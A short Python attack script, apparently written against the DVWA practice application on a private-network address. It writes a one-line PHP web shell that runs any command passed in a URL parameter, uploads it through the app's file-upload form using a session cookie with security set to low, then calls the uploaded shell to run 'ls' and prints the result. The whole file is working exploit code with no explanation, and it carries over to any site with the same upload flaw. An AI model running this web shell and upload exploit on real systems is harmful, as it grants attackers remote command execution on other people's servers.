import requests

Webshell = open("Webshell77.php",'w')
data = "<?php system($_GET['cmd']); ?>"
Webshell.write(data)    
Webshell.close()
URL = "http://10.0.2.15:8080/vulnerabilities/upload/"
        
cookie={
        "PHPSESSID":"mtmr8lk10mfbt9ibj827fvlrh0",
        "security":"low"
        }

files = {
        "MAX_FILE_SIZE": (None,"100000"),
        "uploaded": open("Webshell77.php","r"),
        "Upload":(None,"Upload"),
        }

session1 = requests.Session()
    
req=session1.post(URL,cookies=cookie,files=files)

if(req.text.find("succesfully")!=-1):
    print ("file_upload succes!!")

else:
    print ("error")

URL2 = "http://10.0.2.15:8080/hackable/uploads/Webshell77.php?cmd=ls"

req2=session1.get(URL2,cookies=cookie)

print(req2.text);

